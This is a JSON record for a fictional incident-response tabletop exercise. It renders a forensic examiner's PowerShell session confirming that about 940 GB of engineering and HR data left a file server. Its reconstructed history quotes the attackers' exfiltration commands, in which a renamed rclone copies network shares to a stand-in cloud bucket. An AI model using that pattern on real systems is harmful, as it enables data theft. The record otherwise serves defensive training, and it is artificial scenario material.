@@ -1,0 +1,194 @@
+{
+  "id": "01M792ZRCNNB6C8HJCT2GJH72J",
+  "mselRowId": "I-09",
+  "type": "console_dump",
+  "title": "Blackwater Cyber: ICM-FS-04 Command History, Exfiltration Confirmed",
+  "deliveryMode": "hand_to_role",
+  "fields": {
+    "windowTitle": "Administrator: Windows PowerShell | BWC case ICM-0325 | ICM-FS-04 image (read-only) | PRIVILEGED & CONFIDENTIAL, at the direction of Harrow Fenn LLP",
+    "host": "ICM-FS-04",
+    "user": "bwc.examiner",
+    "cwd": "C:\\BWC\\case-ICM-0325",
+    "prompt": "PS C:\\BWC\\case-ICM-0325>",
+    "commands": [
+      {
+        "cmd": "Get-Content .\\notes\\header.txt",
+        "output": "PRIVILEGED AND CONFIDENTIAL. ATTORNEY WORK PRODUCT.\nPrepared by Blackwater Cyber at the direction of Harrow Fenn LLP for Ironcrest Machinery Corporation (fictional).\nTo: CISO, Ironcrest Machinery Corporation\nThursday, March 25, 2027, 18:55 CT\nSource: forensic image of ICM-FS-04, mounted read-only at E:\\mount\\ICM-FS-04. Nothing was restored or changed on the live host.\nExercise aid, not legal advice. Check the current rule and your counsel.",
+        "error": false
+      },
+      {
+        "cmd": "Import-Csv .\\recon\\ICM-FS-04_cmdhist_reconstructed.csv | Where-Object { $_.Line -match 'rcl\\.exe|\\.7z' } | Format-Table Time,Line -AutoSize",
+        "output": "Time Line\n---- ----\n2027-03-23 22:47:11 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-04\\Engineering\\Released\\ s3remote:bkt-7731/eng --transfers 16\n2027-03-23 23:58:40 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-03\\HR\\Exports\\ s3remote:bkt-7731/hr\n2027-03-24 03:12:05 Staged archive deleted: eng_rel_part01-14.7z",
+        "error": false
+      },
+      {
+        "cmd": "(Get-Item E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\rcl.exe).VersionInfo | Format-List OriginalFilename,ProductName,FileVersion",
+        "output": "OriginalFilename : rclone.exe\nProductName : Rclone\nFileVersion : 1.66.0",
+        "error": false
+      },
+      {
+        "cmd": "Import-Csv .\\netflow\\fs04_egress_20270323-24.csv | Where-Object DstIP -eq '198.51.100.88' | Group-Object SrcShare | Select-Object Name,@{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}}",
+        "output": "Name GB\n---- --\nEngineering\\Released 812\nHR\\Exports 128\n\nTotal to 198.51.100.88 (s3remote, hosting provider): 940 GB, 2027-03-23 22:47 to 2027-03-24 02:51 CT",
+        "error": false
+      },
+      {
+        "cmd": "Get-ChildItem E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z",
+        "output": "Get-ChildItem : Cannot find path 'E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z' because it does not exist.\n + CategoryInfo : ObjectNotFound: (E:\\mount\\ICM-FS...eng_rel_part*.7z:String) [Get-ChildItem], ItemNotFoundException\n + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand",
+        "error": true
+      },
+      {
+        "cmd": "Get-Content .\\notes\\examiner_note_1855.txt",
+        "output": "This ties the roughly 940 GB of Tuesday-night outbound traffic to the Engineering Released share and an HR export folder.\nrcl.exe is a renamed copy of rclone.exe. The staged archives (eng_rel_part01-14.7z) were deleted at 03:12 on Wednesday, so we cannot list their contents from this host.\nWe cannot yet say which drawings or how many personnel records were taken. The attackers' 1.2 TB claim may include other sources.\nTreat exfiltration as CONFIRMED and its contents as UNKNOWN.\nIndicators for sharing through counsel: rcl.exe (OriginalFilename rclone.exe), C:\\ProgramData\\svcupd\\, s3remote:bkt-7731, 198.51.100.88.\nNext update after the persistence sweep checkpoint, about 23:00 CT.",
+        "error": false
+      }
+    ],
+    "showCursor": true
+  },
+  "variant": "powershell",
+  "instructorNote": "This is a clue inject. It turns exfiltration from suspected to confirmed and points to engineering IP and possibly HR personal data. Watch for three things. First, the CISO should tell the GC at once under IDCCI 2 and brief the 19:00 Disclosure Committee on what is confirmed, suspected and unknown. Second, the indicators (rcl.exe, bkt-7731) should go to the FBI through the GC. Third, the team should keep any conclusions about fault out of chat and restore nothing.",
+  "citations": [
+    {
+      "documentId": "01M791NWEX7JTKWMS6TART9E7B",
+      "documentTitle": "ICM-LEG-03: Disclosure Controls for Cybersecurity Incidents",
+      "headingPath": "IDCCI › 2. Who reports to whom",
+      "quote": "Any employee who suspects an incident calls the Security Operations Center (SOC), (815) 555-0122. The SOC reports to the CISO, Anil Deshmukh. The CISO tells the General Counsel, Marguerite Daley, with",
+      "chunkId": 31
+    },
+    {
+      "documentId": "01M791NWETPNJ2B6DP42BR9D8C",
+      "documentTitle": "ICM-BCM-02: Business Impact Analysis and Recovery Order",
+      "headingPath": "IBIARO › 6. Key suppliers and vendors",
+      "quote": "The company's cloud provider, the payroll provider (Northbridge Payroll, fictional), the outside data center and network carriers, the warehouse software vendor, the steel supplier, the forensic firm ",
+      "chunkId": 16
+    }
+  ],
+  "mediaBrief": {
+    "paths": [
+      "template"
+    ]
+  },
+  "assets": [
+    {
+      "id": "01M79BVQB6F5ZS5XB2YDJKRVHQ",
+      "kind": "image",
+      "path": "scenarios/01M791NYFD5GNSAF0J0E4J4T0E/media/01M792ZRCNNB6C8HJCT2GJH72J/01M79BVQB6F5ZS5XB2YDJKRVHQ.png",
+      "role": "rendered",
+      "width": 1100,
+      "height": 953,
+      "sha256": "f3df583c51b642ed99085303eca4d82aac376f7f385b28a5268e22d0f003da5c",
+      "provenance": {
+        "provider": "template",
+        "templateId": "console_dump",
+        "templateVersion": "1",
+        "createdAt": "2026-11-13T02:30:20.600Z"
+      }
+    }
+  ],
+  "versions": [
+    {
+      "at": "2026-11-12T23:56:16.972Z",
+      "by": "ai",
+      "note": "generated",
+      "snapshot": {
+        "title": "Blackwater Cyber: ICM-FS-04 Command History, Exfiltration Confirmed",
+        "type": "console_dump",
+        "fields": {
+          "windowTitle": "Administrator: Windows PowerShell | BWC case ICM-0325 | ICM-FS-04 image (read-only) | PRIVILEGED & CONFIDENTIAL, at the direction of Harrow Fenn LLP",
+          "host": "ICM-FS-04",
+          "user": "bwc.examiner",
+          "cwd": "C:\\BWC\\case-ICM-0325",
+          "prompt": "PS C:\\BWC\\case-ICM-0325>",
+          "commands": [
+            {
+              "cmd": "Get-Content .\\notes\\header.txt",
+              "output": "PRIVILEGED AND CONFIDENTIAL. ATTORNEY WORK PRODUCT.\nPrepared by Blackwater Cyber at the direction of Harrow Fenn LLP for Ironcrest Machinery Corporation (fictional).\nTo: CISO, Ironcrest Machinery Corporation\nThursday, March 25, 2027, 18:55 CT\nSource: forensic image of ICM-FS-04, mounted read-only at E:\\mount\\ICM-FS-04. Nothing was restored or changed on the live host.\nExercise aid, not legal advice. Check the current rule and your counsel.",
+              "error": false
+            },
+            {
+              "cmd": "Import-Csv .\\recon\\ICM-FS-04_cmdhist_reconstructed.csv | Where-Object { $_.Line -match 'rcl\\.exe|\\.7z' } | Format-Table Time,Line -AutoSize",
+              "output": "Time Line\n---- ----\n2027-03-23 22:47:11 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-04\\Engineering\\Released\\ s3remote:bkt-7731/eng --transfers 16\n2027-03-23 23:58:40 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-03\\HR\\Exports\\ s3remote:bkt-7731/hr\n2027-03-24 03:12:05 Staged archive deleted: eng_rel_part01-14.7z",
+              "error": false
+            },
+            {
+              "cmd": "(Get-Item E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\rcl.exe).VersionInfo | Format-List OriginalFilename,ProductName,FileVersion",
+              "output": "OriginalFilename : rclone.exe\nProductName : Rclone\nFileVersion : 1.66.0",
+              "error": false
+            },
+            {
+              "cmd": "Import-Csv .\\netflow\\fs04_egress_20270323-24.csv | Where-Object DstIP -eq '198.51.100.88' | Group-Object SrcShare | Select-Object Name,@{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}}",
+              "output": "Name GB\n---- --\nEngineering\\Released 812\nHR\\Exports 128\n\nTotal to 198.51.100.88 (s3remote, hosting provider): 940 GB, 2027-03-23 22:47 to 2027-03-24 02:51 CT",
+              "error": false
+            },
+            {
+              "cmd": "Get-ChildItem E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z",
+              "output": "Get-ChildItem : Cannot find path 'E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z' because it does not exist.\n + CategoryInfo : ObjectNotFound: (E:\\mount\\ICM-FS...eng_rel_part*.7z:String) [Get-ChildItem], ItemNotFoundException\n + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand",
+              "error": true
+            },
+            {
+              "cmd": "Get-Content .\\notes\\examiner_note_1855.txt",
+              "output": "This ties the roughly 940 GB of Tuesday-night outbound traffic to the Engineering Released share and an HR export folder.\nrcl.exe is a renamed copy of rclone.exe. The staged archives (eng_rel_part01-14.7z) were deleted at 03:12 on Wednesday, so we cannot list their contents from this host.\nWe cannot yet say which drawings or how many personnel records were taken. The attackers' 1.2 TB claim may include other sources.\nTreat exfiltration as CONFIRMED and its contents as UNKNOWN.\nIndicators for sharing through counsel: rcl.exe (OriginalFilename rclone.exe), C:\\ProgramData\\svcupd\\, s3remote:bkt-7731, 198.51.100.88.\nNext update after the persistence sweep checkpoint, about 23:00 CT.",
+              "error": false
+            }
+          ],
+          "showCursor": true
+        },
+        "instructorNote": "This is a clue inject. It turns exfiltration from suspected to confirmed and points to engineering IP and possibly HR personal data. Watch for three things. First, the CISO should tell the GC within one hour under IDCCI 2 and brief the 19:00 Disclosure Committee on what is confirmed, suspected and unknown. Second, the indicators (rcl.exe, bkt-7731) should go to the FBI through the GC. Third, the team should keep any conclusions about fault out of chat and restore nothing.",
+        "deliveryMode": "hand_to_role"
+      }
+    },
+    {
+      "at": "2026-11-13T01:33:52.758Z",
+      "by": "user",
+      "note": "Corrected by hand for the shipped example",
+      "snapshot": {
+        "title": "Blackwater Cyber: ICM-FS-04 Command History, Exfiltration Confirmed",
+        "type": "console_dump",
+        "fields": {
+          "windowTitle": "Administrator: Windows PowerShell | BWC case ICM-0325 | ICM-FS-04 image (read-only) | PRIVILEGED & CONFIDENTIAL, at the direction of Harrow Fenn LLP",
+          "host": "ICM-FS-04",
+          "user": "bwc.examiner",
+          "cwd": "C:\\BWC\\case-ICM-0325",
+          "prompt": "PS C:\\BWC\\case-ICM-0325>",
+          "commands": [
+            {
+              "cmd": "Get-Content .\\notes\\header.txt",
+              "output": "PRIVILEGED AND CONFIDENTIAL. ATTORNEY WORK PRODUCT.\nPrepared by Blackwater Cyber at the direction of Harrow Fenn LLP for Ironcrest Machinery Corporation (fictional).\nTo: CISO, Ironcrest Machinery Corporation\nThursday, March 25, 2027, 18:55 CT\nSource: forensic image of ICM-FS-04, mounted read-only at E:\\mount\\ICM-FS-04. Nothing was restored or changed on the live host.\nExercise aid, not legal advice. Check the current rule and your counsel.",
+              "error": false
+            },
+            {
+              "cmd": "Import-Csv .\\recon\\ICM-FS-04_cmdhist_reconstructed.csv | Where-Object { $_.Line -match 'rcl\\.exe|\\.7z' } | Format-Table Time,Line -AutoSize",
+              "output": "Time Line\n---- ----\n2027-03-23 22:47:11 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-04\\Engineering\\Released\\ s3remote:bkt-7731/eng --transfers 16\n2027-03-23 23:58:40 C:\\ProgramData\\svcupd\\rcl.exe copy \\\\ICM-FS-03\\HR\\Exports\\ s3remote:bkt-7731/hr\n2027-03-24 03:12:05 Staged archive deleted: eng_rel_part01-14.7z",
+              "error": false
+            },
+            {
+              "cmd": "(Get-Item E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\rcl.exe).VersionInfo | Format-List OriginalFilename,ProductName,FileVersion",
+              "output": "OriginalFilename : rclone.exe\nProductName : Rclone\nFileVersion : 1.66.0",
+              "error": false
+            },
+            {
+              "cmd": "Import-Csv .\\netflow\\fs04_egress_20270323-24.csv | Where-Object DstIP -eq '198.51.100.88' | Group-Object SrcShare | Select-Object Name,@{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}}",
+              "output": "Name GB\n---- --\nEngineering\\Released 812\nHR\\Exports 128\n\nTotal to 198.51.100.88 (s3remote, hosting provider): 940 GB, 2027-03-23 22:47 to 2027-03-24 02:51 CT",
+              "error": false
+            },
+            {
+              "cmd": "Get-ChildItem E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z",
+              "output": "Get-ChildItem : Cannot find path 'E:\\mount\\ICM-FS-04\\ProgramData\\svcupd\\eng_rel_part*.7z' because it does not exist.\n + CategoryInfo : ObjectNotFound: (E:\\mount\\ICM-FS...eng_rel_part*.7z:String) [Get-ChildItem], ItemNotFoundException\n + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand",
+              "error": true
+            },
+            {
+              "cmd": "Get-Content .\\notes\\examiner_note_1855.txt",
+              "output": "This ties the roughly 940 GB of Tuesday-night outbound traffic to the Engineering Released share and an HR export folder.\nrcl.exe is a renamed copy of rclone.exe. The staged archives (eng_rel_part01-14.7z) were deleted at 03:12 on Wednesday, so we cannot list their contents from this host.\nWe cannot yet say which drawings or how many personnel records were taken. The attackers' 1.2 TB claim may include other sources.\nTreat exfiltration as CONFIRMED and its contents as UNKNOWN.\nIndicators for sharing through counsel: rcl.exe (OriginalFilename rclone.exe), C:\\ProgramData\\svcupd\\, s3remote:bkt-7731, 198.51.100.88.\nNext update after the persistence sweep checkpoint, about 23:00 CT.",
+              "error": false
+            }
+          ],
+          "showCursor": true
+        },
+        "instructorNote": "This is a clue inject. It turns exfiltration from suspected to confirmed and points to engineering IP and possibly HR personal data. Watch for three things. First, the CISO should tell the GC at once under IDCCI 2 and brief the 19:00 Disclosure Committee on what is confirmed, suspected and unknown. Second, the indicators (rcl.exe, bkt-7731) should go to the FBI through the GC. Third, the team should keep any conclusions about fault out of chat and restore nothing.",
+        "deliveryMode": "hand_to_role"
+      }
+    }
+  ],
+  "includeInDeck": true,
+  "locked": false,
+  "updatedAt": "2026-11-13T02:30:20.775Z"
+}
